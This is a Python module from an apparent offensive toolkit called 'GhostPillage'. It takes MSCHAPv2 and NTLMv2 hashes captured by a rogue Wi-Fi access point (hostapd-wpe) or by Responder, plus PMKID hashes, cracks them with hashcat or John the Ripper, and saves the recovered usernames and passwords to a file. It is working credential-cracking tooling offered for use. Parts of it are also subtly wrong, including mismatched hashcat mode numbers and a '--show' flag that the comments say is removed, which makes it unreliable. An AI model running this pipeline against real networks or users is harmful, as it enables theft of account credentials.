#!/usr/bin/env python3
"""
crack/hash_cracker.py — Credential Hash Cracking Engine

Yeh file captured hashes ko crack karti hai:
- hostapd-wpe se captured MSCHAPv2 hashes (WPA2-Enterprise)
- Responder se captured NTLMv1/v2 hashes
- PMKID hashes (WPA3/WPA2)

Tools used:
- hashcat (GPU-accelerated cracking)
- hcxpcaptool (PMKID extraction)
- John the Ripper (fallback)

Attack modes:
- Dictionary attack (wordlist)
- Rule-based attack (hashcat rules)
- Brute-force (mask attack)
- Combined (dictionary + rules)
"""

import os
import re
import sys
import subprocess
from datetime import datetime

# Local imports
from utils.helpers import log, run_command, file_exists, write_file, read_file


class HashCracker:
    """
    Credential hash cracking engine.
    
    Features:
    - Auto-detect hash type
    - Multiple attack modes
    - GPU acceleration (via hashcat)
    - Progress monitoring
    - Result parsing and storage
    """
    
    # Hashcat mode mappings
    HASH_MODES = {
        "netntlmv2": 5500,       # MSCHAPv2 (hostapd-wpe / Responder)
        "netntlmv1": 5500,       # NetNTLMv1
        "ntlm": 1000,            # NTLM
        "pmkid": 22000,          # WPA/WPA2 PMKID
        "wpa_eapol": 16800,      # WPA-PBKDF2-PMKID+EAPOL
    }
    
    def __init__(self, config_dir="/tmp/ghostpillage", verbose=False):
        """
        Initialize hash cracker.
        
        Args:
            config_dir (str): Directory for output
            verbose (bool): Verbose logging
        """
        self.config_dir = config_dir
        self.verbose = verbose
        self.log_file = os.path.join(config_dir, "cracker.log")
        
        # Create output directories
        self.hash_dir = os.path.join(config_dir, "hashes")
        self.cracked_dir = os.path.join(config_dir, "cracked")
        self.wordlist_dir = "/usr/share/wordlists"
        os.makedirs(self.hash_dir, exist_ok=True)
        os.makedirs(self.cracked_dir, exist_ok=True)
        
        # State
        self.cracked_passwords = []
        self.attack_log = os.path.join(config_dir, "crack_attempts.log")
        
        log(self.log_file, "[+] HashCracker initialized", verbose)
    
    
    def extract_and_crack(self, log_path, wordlist=None, rules=None):
        """
        Extract hashes from log file and start cracking.
        
        Complete pipeline:
        1. Detect hash type from log
        2. Extract hashes to clean file
        3. Select wordlist
        4. Run hashcat
        5. Parse results
        
        Args:
            log_path (str): Path to log file (hostapd-wpe log, Responder log)
            wordlist (str): Path to wordlist (optional, auto-detect)
            rules (str): Path to hashcat rules (optional)
        
        Returns:
            list: Cracked credentials [(username, password), ...]
        """
        log(self.log_file, f"[*] Starting extraction from: {log_path}", self.verbose)
        print(f"\n{'='*60}")
        print(f"  [PHASE 4] Credential Cracking")
        print(f"{'='*60}")
        
        # Step 1: Detect and extract hashes
        hash_type, hashes = self._detect_and_extract(log_path)
        
        if not hashes:
            print("\n[!] No hashes found in log file")
            log(self.log_file, "[!] No hashes extracted", self.verbose)
            return []
        
        print(f"\n[+] Found {len(hashes)} hashes (type: {hash_type})")
        
        # Step 2: Save hashes to clean file
        hash_file = os.path.join(self.hash_dir, f"{hash_type}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
        
        # Format hashes for hashcat
        formatted_hashes = self._format_hashes(hash_type, hashes)
        write_file(hash_file, "\n".join(formatted_hashes))
        
        print(f"    Hashes saved: {hash_file}")
        log(self.log_file, f"[+] {len(formatted_hashes)} hashes saved to {hash_file}", self.verbose)
        
        # Step 3: Auto-detect wordlist
        if not wordlist:
            wordlist = self._find_wordlist()
        
        if not wordlist or not file_exists(wordlist):
            print("[!] No wordlist found. Install rockyou.txt or provide custom path.")
            log(self.log_file, "[!] No wordlist available", self.verbose)
            return []
        
        print(f"    Wordlist: {wordlist}")
        
        # Step 4: Get hashcat mode
        hashcat_mode = self.HASH_MODES.get(hash_type, 5500)
        
        # Step 5: Run cracking
        cracked = self._run_hashcat(hash_file, hashcat_mode, wordlist, rules)
        
        # Step 6: Parse results
        if cracked:
            results = self._parse_hashcat_output(cracked)
            self.cracked_passwords.extend(results)
            
            print(f"\n[+] Cracked {len(results)} credentials:")
            for username, password in results[:10]:  # Show first 10
                print(f"    {username}: {password}")
            
            if len(results) > 10:
                print(f"    ... and {len(results)-10} more")
            
            # Save results
            self._save_cracked_results(results)
        else:
            print("\n[-] No passwords cracked in this run")
        
        return self.cracked_passwords
    
    
    def _detect_and_extract(self, log_path):
        """
        Detect hash type and extract hashes from log file.
        
        Supports:
        - hostapd-wpe log format (username + MSCHAPv2 hash)
        - Responder log format (NTLMv2 hashes)
        - hcxdumptool format (PMKID hashes)
        
        Args:
            log_path (str): Path to log file
        
        Returns:
            tuple: (hash_type_string, list_of_hash_dicts)
        """
        content = read_file(log_path)
        if not content:
            return ("unknown", [])
        
        # Method 1: Check hostapd-wpe format
        # Format: username:hash:challenge:response
        hostapd_pattern = r'(\w[\w\.@-]+)\s+([a-f0-9]{32}:[a-f0-9]{32}:[a-f0-9]{32})'
        hostapd_matches = re.findall(hostapd_pattern, content, re.IGNORECASE)
        
        if hostapd_matches:
            hashes = []
            for username, hash_data in hostapd_matches:
                hashes.append({
                    "username": username,
                    "hash": f"{username}::{hash_data}",
                    "type": "netntlmv2"
                })
            return ("netntlmv2", hashes)
        
        # Method 2: Check hostapd-wpe alternative format
        # Lines containing "challenge" and "response"
        if "mschapv2" in content.lower() or "challenge" in content.lower():
            # Try to parse the structured hostapd-wpe output
            lines = content.split("\n")
            hashes = []
            current_username = None
            
            for line in lines:
                # Look for username
                if "username:" in line.lower() or "user:" in line.lower():
                    username_match = re.search(r'username:\s*(\S+)', line, re.IGNORECASE)
                    if username_match:
                        current_username = username_match.group(1)
                
                # Look for hash
                if "hash:" in line.lower() or "ntlm:" in line.lower() or "response:" in line.lower():
                    # Extract the hash value
                    parts = line.split(":")
                    if len(parts) >= 3:
                        hash_str = ":".join(parts[-3:]).strip()
                        if len(hash_str) > 30 and current_username:
                            hashes.append({
                                "username": current_username,
                                "hash": f"{current_username}::{hash_str}",
                                "type": "netntlmv2"
                            })
                            current_username = None
            
            if hashes:
                return ("netntlmv2", hashes)
        
        # Method 3: Responder log format
        # Format: NTLMv2 hash lines
        responder_pattern = r'(\S+)::(\S+):[a-f0-9]{32}:[a-f0-9]{32}:[a-f0-9]{32,}'
        responder_matches = re.findall(responder_pattern, content, re.IGNORECASE)
        
        if responder_matches:
            hashes = []
            seen = set()
            for username, domain in responder_matches:
                # Find the full hash line
                for line in content.split("\n"):
                    if username in line and "::" in line and line not in seen:
                        seen.add(line)
                        hashes.append({
                            "username": username,
                            "hash": line.strip(),
                            "type": "netntlmv2"
                        })
                        break
            if hashes:
                return ("netntlmv2", hashes)
        
        # Method 4: PMKID format (hcxdumptool)
        pmkid_pattern = r'[a-f0-9]{32}\*[a-f0-9]{12}\*[a-f0-9]{12}\*[a-f0-9]{4,}'
        pmkid_matches = re.findall(pmkid_pattern, content, re.IGNORECASE)
        
        if pmkid_matches:
            hashes = []
            for pmkid in pmkid_matches:
                hashes.append({
                    "username": None,
                    "hash": pmkid,
                    "type": "pmkid"
                })
            return ("pmkid", hashes)
        
        # Method 5: Generic — look for any hash-like patterns
        # Just return raw content and let user specify type
        return ("unknown", [{"username": "unknown", "hash": line.strip(), "type": "unknown"} 
                           for line in content.split("\n") if len(line.strip()) > 20])
    
    
    def _format_hashes(self, hash_type, hashes):
        """
        Format hashes for hashcat input.
        
        Different hash types need different formatting:
        - netntlmv2: username::domain:challenge:response
        - pmkid: PMKID*APMAC*ClientMAC*ESSID
        
        Args:
            hash_type (str): Type of hash
            hashes (list): List of hash dicts
        
        Returns:
            list: Formatted hash strings
        """
        formatted = []
        
        for h in hashes:
            if h["hash"] and h["hash"] not in formatted:
                formatted.append(h["hash"])
        
        return formatted
    
    
    def _find_wordlist(self):
        """
        Find available wordlist on the system.
        
        Checks common wordlist locations:
        - /usr/share/wordlists/rockyou.txt
        - /usr/share/wordlists/rockyou.txt.gz
        - /usr/share/wordlists/ (any .txt file)
        - Kali default wordlists
        
        Returns:
            str: Path to wordlist or None
        """
        # Common wordlist locations
        wordlists = [
            "/usr/share/wordlists/rockyou.txt",
            "/usr/share/wordlists/rockyou.txt.gz",
            "/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt",
            "/usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt",
            "/usr/share/wordlists/fasttrack.txt",
            "/usr/share/john/password.lst",
        ]
        
        for wl in wordlists:
            if file_exists(wl):
                log(self.log_file, f"[+] Found wordlist: {wl}", self.verbose)
                return wl
        
        # Search for any wordlist
        for root, dirs, files in os.walk("/usr/share/wordlists"):
            for f in files:
                if f.endswith(".txt"):
                    return os.path.join(root, f)
        
        return None
    
    
    def _run_hashcat(self, hash_file, hashcat_mode, wordlist, rules=None):
        """
        Run hashcat to crack hashes.
        
        Args:
            hash_file (str): Path to hash file
            hashcat_mode (int): Hashcat mode number
            wordlist (str): Path to wordlist
            rules (str): Path to rules file (optional)
        
        Returns:
            str: Hashcat output (for parsing)
        """
        log(self.log_file, f"[*] Running hashcat (mode: {hashcat_mode})", self.verbose)
        print(f"\n[*] Cracking with hashcat (mode {hashcat_mode})...")
        print(f"    Press 's' during cracking for status")
        
        # Output file for cracked hashes
        output_file = os.path.join(self.cracked_dir, f"cracked_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
        
        # Check if hashcat is available
        if not self._check_tool("hashcat"):
            print("    [!] hashcat not found. Trying john...")
            return self._run_john(hash_file, hashcat_mode, wordlist)
        
        # Build hashcat command
        cmd = [
            "hashcat",
            "-m", str(hashcat_mode),
            "-a", "0",  # Dictionary attack
            "-o", output_file,
            "--force",  # Ignore warnings
            "--potfile-disable",  # Don't use global potfile
            "--show",  # Show cracked passwords
            hash_file,
            wordlist
        ]
        
        # Add rules if specified
        if rules and file_exists(rules):
            cmd.extend(["-r", rules])
        else:
            # Default rule: best64.rule
            default_rule = "/usr/share/hashcat/rules/best64.rule"
            if file_exists(default_rule):
                cmd.extend(["-r", default_rule])
        
        # Run hashcat (first pass: just show already cracked)
        log(self.log_file, f"[CMD] {' '.join(cmd)}", self.verbose)
        
        try:
            # First try --show to get any previously cracked
            show_cmd = cmd.copy()
            show_cmd.append("--show")
            result = run_command(" ".join(show_cmd), timeout=10, verbose=False)
            
            if result["success"] and result["stdout"].strip():
                log(self.log_file, "[+] Found previously cracked hashes", self.verbose)
                return result["stdout"]
            
            # Run actual cracking (with timeout for demo purposes)
            actual_cmd = " ".join(cmd[:-2])  # Remove --show
            actual_cmd += f" {hash_file} {wordlist}"
            if rules and file_exists(rules):
                actual_cmd += f" -r {rules}"
            actual_cmd += " --force --potfile-disable"
            
            print("    [*] Cracking in progress (30 second demo run)...")
            
            # Run hashcat with 30 second timeout for demo
            # In real use, remove timeout and let it run
            result = run_command(actual_cmd, timeout=30, verbose=self.verbose, log_file=self.log_file)
            
            # Check if output file was created
            if file_exists(output_file):
                output = read_file(output_file)
                log(self.log_file, f"[+] Cracked output found: {len(output.split(chr(10)))} lines", self.verbose)
                return output
            
            # Try --show again after cracking attempt
            show_result = run_command(" ".join(show_cmd), timeout=10, verbose=False)
            if show_result["success"] and show_result["stdout"].strip():
                return show_result["stdout"]
            
            return ""
            
        except Exception as e:
            log(self.log_file, f"[!] hashcat error: {e}", self.verbose)
            print(f"    [!] Error: {e}")
            return ""
    
    
    def _run_john(self, hash_file, hashcat_mode, wordlist):
        """
        Fallback: Use John the Ripper if hashcat not available.
        
        Args:
            hash_file (str): Path to hash file
            hashcat_mode (int): Hashcat mode (for reference)
            wordlist (str): Path to wordlist
        
        Returns:
            str: John output
        """
        log(self.log_file, "[*] Trying John the Ripper...", self.verbose)
        
        if not self._check_tool("john"):
            log(self.log_file, "[!] Neither hashcat nor john available", self.verbose)
            print("    [!] No cracking tools available!")
            return ""
        
        output_file = os.path.join(self.cracked_dir, "john_cracked.txt")
        
        # Convert hash format for John if needed
        john_ready = hash_file
        
        # Run John
        cmd = (
            f"john --wordlist={wordlist} "
            f"--pot={output_file} "
            f"--format=netntlmv2 "
            f"{john_ready} 2>/dev/null"
        )
        
        result = run_command(cmd, timeout=30, verbose=self.verbose, log_file=self.log_file)
        
        # Show cracked passwords
        show_cmd = f"john --show --pot={output_file} {john_ready} 2>/dev/null"
        show_result = run_command(show_cmd, timeout=10, verbose=False)
        
        return show_result["stdout"] if show_result["success"] else ""
    
    
    def _parse_hashcat_output(self, output):
        """
        Parse hashcat output to extract username:password pairs.
        
        Args:
            output (str): Hashcat output
        
        Returns:
            list: [(username, password), ...]
        """
        results = []
        
        for line in output.strip().split("\n"):
            line = line.strip()
            if not line or line.startswith("#") or line.startswith("Status"):
                continue
            
            # Hashcat output format: hash:password
            if ":" in line:
                parts = line.split(":")
                hash_part = parts[0]
                password = ":".join(parts[1:])  # In case password contains ":"
                
                # Extract username from hash
                username = "Unknown"
                if "::" in hash_part:
                    username = hash_part.split("::")[0]
                elif "*" in hash_part:
                    # PMKID format
                    username = "[PMKID]"
                
                results.append((username, password))
        
        return results
    
    
    def _save_cracked_results(self, results):
        """
        Save cracked credentials to file.
        
        Args:
            results (list): [(username, password), ...]
        """
        if not results:
            return
        
        # Save in readable format
        readable_file = os.path.join(self.cracked_dir, "credentials.txt")
        with open(readable_file, "w") as f:
            f.write(f"# GhostPillage Cracked Credentials\n")
            f.write(f"# Date: {datetime.now().isoformat()}\n")
            f.write(f"# Total: {len(results)}\n")
            f.write(f"{'='*50}\n\n")
            
            for username, password in results:
                f.write(f"{username}:{password}\n")
        
        # Save in hashcat format
        hashcat_file = os.path.join(self.cracked_dir, "hashcat_output.txt")
        # Already saved by hashcat
        
        log(self.log_file, f"[+] Results saved: {readable_file}", self.verbose)
        print(f"\n[+] All credentials saved: {readable_file}")
    
    
    def brute_force_pmkid(self, hash_file, mask="?d?d?d?d?d?d?d?d"):
        """
        Brute-force attack for PMKID hashes (8-digit PIN).
        
        WPS PINs are usually 8 digits. This uses hashcat mask attack.
        
        Args:
            hash_file (str): Path to PMKID hash file
            mask (str): Mask pattern (default: 8 digits)
        
        Returns:
            list: Cracked passwords
        """
        log(self.log_file, f"[*] Starting PMKID brute-force (mask: {mask})", self.verbose)
        print(f"\n[*] Brute-forcing PMKID (mask: {mask})...")
        
        if not self._check_tool("hashcat"):
            print("    [!] hashcat required for brute-force")
            return []
        
        output_file = os.path.join(self.cracked_dir, f"pmkid_brute_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
        
        cmd = (
            f"hashcat -m 22000 -a 3 "
            f"-o {output_file} "
            f"--force --potfile-disable "
            f"{hash_file} {mask} 2>/dev/null"
        )
        
        print("    [*] Running brute-force (30 second demo)...")
        result = run_command(cmd, timeout=30, verbose=self.verbose, log_file=self.log_file)
        
        if file_exists(output_file):
            output = read_file(output_file)
            results = self._parse_hashcat_output(output)
            
            if results:
                print(f"    [+] PMKID cracked: {results[0][1]}")
                self._save_cracked_results(results)
            
            return results
        
        print("    [-] PMKID not cracked (need more time or different mask)")
        return []
    
    
    def _check_tool(self, tool_name):
        """
        Check if a system tool is installed.
        
        Args:
            tool_name (str): Tool name
        
        Returns:
            bool: True if installed
        """
        result = run_command(f"which {tool_name}", timeout=3, verbose=False)
        return result["success"]
    
    
    def get_all_cracked(self):
        """
        Get all cracked passwords.
        
        Returns:
            list: [(username, password), ...]
        """
        return self.cracked_passwords


# Agar directly run kiya jaaye
if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python3 hash_cracker.py <log_file> [wordlist]")
        print("Example: python3 hash_cracker.py /tmp/hostapd-wpe/hostapd-wpe.log")
        print("         python3 hash_cracker.py /tmp/hostapd-wpe/hostapd-wpe.log /usr/share/wordlists/rockyou.txt")
        sys.exit(1)
    
    log_path = sys.argv[1]
    wordlist = sys.argv[2] if len(sys.argv) > 2 else None
    
    if not file_exists(log_path):
        print(f"[!] File not found: {log_path}")
        sys.exit(1)
    
    cracker = HashCracker("/tmp/ghostpillage", verbose=True)
    results = cracker.extract_and_crack(log_path, wordlist)
    
    print(f"\n[+] Total cracked: {len(results)}")